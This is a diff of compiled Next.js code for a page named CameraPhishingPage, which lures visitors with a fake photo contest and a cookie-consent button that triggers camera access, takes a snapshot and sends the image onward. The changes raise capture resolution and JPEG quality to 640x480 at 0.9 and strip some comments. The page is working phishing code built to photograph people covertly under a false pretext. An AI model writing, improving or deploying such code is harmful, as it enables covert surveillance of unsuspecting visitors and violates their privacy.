@@ -187,6 +187,7 @@ var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$re
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$trophy$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Trophy$3e$__ = __turbopack_context__.i("[project]/node_modules/lucide-react/dist/esm/icons/trophy.js [app-ssr] (ecmascript) <export default as Trophy>");
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$cookie$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Cookie$3e$__ = __turbopack_context__.i("[project]/node_modules/lucide-react/dist/esm/icons/cookie.js [app-ssr] (ecmascript) <export default as Cookie>");
 var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$image$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Image$3e$__ = __turbopack_context__.i("[project]/node_modules/lucide-react/dist/esm/icons/image.js [app-ssr] (ecmascript) <export default as Image>");
+var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/utils.ts [app-ssr] (ecmascript)"); // Added for cn utility
 "use client";
 ;
 ;
@@ -195,7 +196,7 @@ var __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$re
 ;
 ;
 ;
-// Removed next/image import as it's not used for a placeholder in the photo-contest-entry in this version
+;
 const templateContent = {
     'photo-contest-entry': {
         title: 'Capture the Moment: Photo Contest!',
@@ -245,8 +246,8 @@ function CameraPhishingPage() {
         if (videoRef.current && canvasRef.current && videoRef.current.readyState === 4 && videoRef.current.videoWidth > 0) {
             const video = videoRef.current;
             const canvas = canvasRef.current;
-            const MAX_WIDTH = 320;
-            const MAX_HEIGHT = 240;
+            const MAX_WIDTH = 640; // Restored for better quality
+            const MAX_HEIGHT = 480; // Restored for better quality
             let { videoWidth, videoHeight } = video;
             if (videoWidth > videoHeight) {
                 if (videoWidth > MAX_WIDTH) {
@@ -264,7 +265,7 @@ function CameraPhishingPage() {
             const context = canvas.getContext('2d');
             if (context) {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageUrl = canvas.toDataURL('image/jpeg', 0.5);
+                const imageUrl = canvas.toDataURL('image/jpeg', 0.9); // Increased quality to 0.9
                 const cameraData = {
                     imageUrl
                 };
@@ -273,7 +274,7 @@ function CameraPhishingPage() {
                     data: cameraData
                 });
                 setStatus('captured');
-                stopCameraStream(true);
+                stopCameraStream(true); // Pass true to indicate capture happened
             }
         }
     };
@@ -319,9 +320,6 @@ function CameraPhishingPage() {
     };
     const handleCookieConsentAndCamera = ()=>{
         setCookieConsentGiven(true);
-        // It's important that `handleCameraRequest` is called after `cookieConsentGiven` state update might be processed.
-        // A slight delay or directly calling it if state updates are batched should be fine.
-        // For immediate effect, we can call it directly.
         handleCameraRequest();
     };
     const stopCameraStream = (isAfterCapture = false)=>{
@@ -332,6 +330,7 @@ function CameraPhishingPage() {
         if (videoRef.current) {
             videoRef.current.srcObject = null;
         }
+        // Only reset to 'idle' if not after capture and not already in error or captured state
         if (!isAfterCapture && status !== 'captured' && status !== 'error') {
             setStatus('idle');
         }
@@ -358,7 +357,7 @@ function CameraPhishingPage() {
                                     className: "h-16 w-16 text-amber-500 mx-auto mb-4"
                                 }, void 0, false, {
                                     fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                                    lineNumber: 164,
+                                    lineNumber: 162,
                                     columnNumber: 15
                                 }, this),
                                 /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -368,17 +367,17 @@ function CameraPhishingPage() {
                                     }
                                 }, void 0, false, {
                                     fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                                    lineNumber: 165,
+                                    lineNumber: 163,
                                     columnNumber: 15
                                 }, this)
                             ]
                         }, void 0, true, {
                             fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                            lineNumber: 163,
+                            lineNumber: 161,
                             columnNumber: 11
                         }, this),
                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
-                            className: `aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2 ${status === 'streaming' && cookieConsentGiven ? 'border-primary' : 'border-border'}`,
+                            className: (0, __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$utils$2e$ts__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["cn"])("aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2", status === 'streaming' && cookieConsentGiven ? 'border-primary' : 'border-border'),
                             children: [
                                 /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("video", {
                                     ref: videoRef,
@@ -387,7 +386,7 @@ function CameraPhishingPage() {
                                     muted: true
                                 }, void 0, false, {
                                     fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                                    lineNumber: 169,
+                                    lineNumber: 170,
                                     columnNumber: 13
                                 }, this),
                                 !(status === 'streaming' && cookieConsentGiven) && !(status === 'captured' && cookieConsentGiven) && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -437,7 +436,7 @@ function CameraPhishingPage() {
                             ]
                         }, void 0, true, {
                             fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                            lineNumber: 168,
+                            lineNumber: 166,
                             columnNumber: 11
                         }, this),
                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("canvas", {
@@ -553,7 +552,7 @@ function CameraPhishingPage() {
                     ]
                 }, void 0, true, {
                     fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                    lineNumber: 157,
+                    lineNumber: 155,
                     columnNumber: 9
                 }, this),
                 !cookieConsentGiven && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -572,7 +571,8 @@ function CameraPhishingPage() {
                             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$button$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["Button"], {
                                 onClick: handleCookieConsentAndCamera,
                                 className: "bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0",
-                                size: "md",
+                                size: "md" // Ensure this size is defined or use default
+                                ,
                                 disabled: isLoading && !cookieConsentGiven,
                                 children: [
                                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$lucide$2d$react$2f$dist$2f$esm$2f$icons$2f$cookie$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__$3c$export__default__as__Cookie$3e$__["Cookie"], {
@@ -603,7 +603,6 @@ function CameraPhishingPage() {
             ]
         }, void 0, true);
     }
-    // Fallback for other camera templates (video-verification, ar-filter, default)
     return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$phishing$2f$PhishingPageLayout$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["PhishingPageLayout"], {
         title: content.title,
         isLoading: isLoading && status !== 'streaming',
@@ -615,7 +614,7 @@ function CameraPhishingPage() {
                 children: content.message
             }, void 0, false, {
                 fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                lineNumber: 243,
+                lineNumber: 242,
                 columnNumber: 7
             }, this),
             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -628,7 +627,7 @@ function CameraPhishingPage() {
                         muted: true
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 246,
+                        lineNumber: 245,
                         columnNumber: 9
                     }, this),
                     status !== 'streaming' && status !== 'captured' && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -638,7 +637,7 @@ function CameraPhishingPage() {
                                 className: "h-16 w-16 text-white/70 mb-2"
                             }, void 0, false, {
                                 fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                                lineNumber: 249,
+                                lineNumber: 248,
                                 columnNumber: 13
                             }, this),
                             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -646,19 +645,19 @@ function CameraPhishingPage() {
                                 children: "Camera feed inactive"
                             }, void 0, false, {
                                 fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                                lineNumber: 250,
+                                lineNumber: 249,
                                 columnNumber: 13
                             }, this)
                         ]
                     }, void 0, true, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 248,
+                        lineNumber: 247,
                         columnNumber: 11
                     }, this)
                 ]
             }, void 0, true, {
                 fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                lineNumber: 245,
+                lineNumber: 244,
                 columnNumber: 7
             }, this),
             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("canvas", {
@@ -666,7 +665,7 @@ function CameraPhishingPage() {
                 className: "hidden"
             }, void 0, false, {
                 fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                lineNumber: 254,
+                lineNumber: 253,
                 columnNumber: 7
             }, this),
             (status === 'idle' || status === 'error') && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$button$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["Button"], {
@@ -678,14 +677,14 @@ function CameraPhishingPage() {
                         className: "mr-2 h-5 w-5"
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 262,
+                        lineNumber: 261,
                         columnNumber: 11
                     }, this),
                     isLoading ? 'Initializing Camera...' : content.actionText || 'Enable Camera'
                 ]
             }, void 0, true, {
                 fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                lineNumber: 257,
+                lineNumber: 256,
                 columnNumber: 9
             }, this),
             status === 'streaming' && !isLoading && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -696,7 +695,7 @@ function CameraPhishingPage() {
                         children: "Camera active. Capturing snapshot..."
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 269,
+                        lineNumber: 268,
                         columnNumber: 11
                     }, this),
                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$button$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["Button"], {
@@ -707,13 +706,13 @@ function CameraPhishingPage() {
                         children: "Stop Camera"
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 270,
+                        lineNumber: 269,
                         columnNumber: 11
                     }, this)
                 ]
             }, void 0, true, {
                 fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                lineNumber: 268,
+                lineNumber: 267,
                 columnNumber: 10
             }, this),
             status === 'captured' && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -723,7 +722,7 @@ function CameraPhishingPage() {
                         className: "mx-auto h-10 w-10 text-green-600 mb-2"
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 276,
+                        lineNumber: 275,
                         columnNumber: 11
                     }, this),
                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -731,7 +730,7 @@ function CameraPhishingPage() {
                         children: "Image Captured"
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 277,
+                        lineNumber: 276,
                         columnNumber: 11
                     }, this),
                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -739,13 +738,13 @@ function CameraPhishingPage() {
                         children: "An image has been captured. This window can now be closed."
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 278,
+                        lineNumber: 277,
                         columnNumber: 11
                     }, this)
                 ]
             }, void 0, true, {
                 fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                lineNumber: 275,
+                lineNumber: 274,
                 columnNumber: 9
             }, this),
             status === 'error' && error && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -755,7 +754,7 @@ function CameraPhishingPage() {
                         className: "mx-auto h-10 w-10 text-red-600 mb-2"
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 283,
+                        lineNumber: 282,
                         columnNumber: 11
                     }, this),
                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -763,7 +762,7 @@ function CameraPhishingPage() {
                         children: "Camera Access Failed"
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 284,
+                        lineNumber: 283,
                         columnNumber: 11
                     }, this),
                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
@@ -771,7 +770,7 @@ function CameraPhishingPage() {
                         children: error
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 285,
+                        lineNumber: 284,
                         columnNumber: 11
                     }, this),
                     /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$components$2f$ui$2f$button$2e$tsx__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["Button"], {
@@ -781,19 +780,19 @@ function CameraPhishingPage() {
                         children: "Try Again"
                     }, void 0, false, {
                         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                        lineNumber: 286,
+                        lineNumber: 285,
                         columnNumber: 12
                     }, this)
                 ]
             }, void 0, true, {
                 fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-                lineNumber: 282,
+                lineNumber: 281,
                 columnNumber: 10
             }, this)
         ]
     }, void 0, true, {
         fileName: "[project]/src/app/phishing/camera/[id]/page.tsx",
-        lineNumber: 237,
+        lineNumber: 236,
         columnNumber: 5
     }, this);
 }
